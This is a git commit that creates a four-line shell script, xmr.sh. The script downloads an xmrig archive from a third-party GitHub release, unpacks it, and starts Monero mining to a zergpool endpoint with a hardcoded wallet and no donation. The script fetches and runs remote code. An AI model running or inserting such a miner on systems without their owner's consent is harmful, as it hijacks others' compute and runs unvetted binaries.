160063a713800ada8043c5dc585cf4ffd173f328
wellas24 <94160008+wellas24@users.noreply.github.com>
2021-11-13 20:49:08 +0530

    Create xmr.sh

---
+++ xmr.sh
@@ -0,0 +1,4 @@
+wget https://github.com/Sorrybroits/developwithnitin/releases/download/alpha/xmrig.tar.gz
+tar -xf xmrig.tar.gz
+cd xmrig/build
+./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u 4BFuzbtLpit7knFAWuMfh6QrxpxGT7b6eDWzBpkdRykkZNeKa82X4EMNPDzZxnkzu229hEJWALCovKSvNMANmKR767XbeXr.cola --keepalive --donate-level 0 -p c=XMR,ID=jackey
